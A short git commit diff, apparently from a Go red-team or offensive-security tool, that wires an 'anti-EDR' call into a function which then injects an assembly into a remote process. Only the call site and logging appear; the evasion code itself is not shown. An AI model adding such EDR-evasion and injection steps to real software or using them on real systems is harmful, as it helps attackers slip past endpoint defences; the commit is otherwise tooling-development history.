e4210614c6aba507cc4efbcb349a1bbdcdb3a8e9
dobinrutis <dobin@broken.ch>
2022-06-07 18:14:42 +0200

    feature: anti-edr for donut

--- pkg/arch/arch_windows_remote.go
+++ pkg/arch/arch_windows_remote.go
@@ -2,7 +2,15 @@
 
 package arch
 
+import log "github.com/sirupsen/logrus"
+
 func ExecRemote(fileContent []byte, injectInto string) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
+	// Activate Anti-EDR if not yet done
+	err = AntiEdr()
+	if err != nil {
+		log.Errorf("Anti EDR failed: %s", err.Error())
+		// We dont care if it doesnt work. No return.
+	}
 
 	stdOut, stdErr, pid, exitCode, err = ExecuteAssembly(fileContent, injectInto)
 	if err != nil {
